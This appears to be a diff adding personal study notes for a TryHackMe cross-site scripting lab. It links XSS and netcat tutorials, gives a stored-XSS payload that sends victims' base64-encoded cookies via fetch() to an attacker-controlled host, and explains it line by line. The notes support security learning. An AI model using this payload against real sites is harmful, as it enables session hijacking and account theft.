@@ -1,0 +1,32 @@
+https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/
+https://medium.com/@Aircon/cross-site-scripting-xss-tryhackme-thm-28ccd423713f
+https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/
+
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+
+1) The </textarea> tag closes the textarea field.
+2) The <script> tag opens open an area for us to write JavaScript.
+3) The fetch() command makes an HTTP request.
+4) {URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
+5) ?cookie= is the query string that will contain the victim's cookies.
+6) btoa() command base64 encodes the victim's cookies.
+7) document.cookie accesses the victim's cookies for the Acme IT Support Website.
+8) </script> closes the JavaScript code block.
+
+
+<select id="cookie-select"></select>
+
+var allCookies = document.cookie.split(";");
+var select = document.getElementById("cookie-select");
+
+for (var i = 0; i < allCookies.length; i++) {
+  var cookie = allCookies[i];
+  var eqPos = cookie.indexOf("=");
+  var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+  var option = document.createElement("option");
+  option.text = name;
+  select.add(option);
+}
+
+
+https://www.forensicxs.com/google-gruyere/
